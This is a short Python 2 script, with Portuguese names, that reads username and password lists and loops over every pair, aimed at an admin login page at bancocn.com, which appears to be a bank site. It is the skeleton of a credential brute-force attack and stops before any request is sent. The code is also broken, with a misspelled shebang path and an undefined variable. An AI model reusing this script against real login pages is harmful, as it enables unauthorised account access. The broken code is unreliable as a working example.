#!udr/bin/python
import urllib2
fuser = open('users.txt')
usuarios = userr.read().split('\n')

fpass = open('pass.txt')
senhas = fpass.read().split('\n')

for usuario in usuarios:
	for senha in senhas:
		print "Testando.. %s ; %s"%(usuario, senha)
		url ="http://www.bancocn.com/admin/login.php"
